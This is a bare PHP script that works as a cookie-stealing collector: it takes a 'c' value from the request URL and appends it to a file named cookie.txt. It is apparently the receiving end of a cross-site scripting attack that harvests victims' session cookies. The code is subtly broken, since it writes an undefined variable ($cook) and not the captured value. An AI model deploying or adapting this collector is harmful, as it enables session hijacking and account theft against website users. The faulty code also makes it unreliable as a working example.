<?php
$cookie = $_GET["c"]; 
if($cookie){

  $fp = fopen("cookie.txt","a"); 

  fputs($fp,$cook . "\r\n");  
  fclose($fp); 
}?>
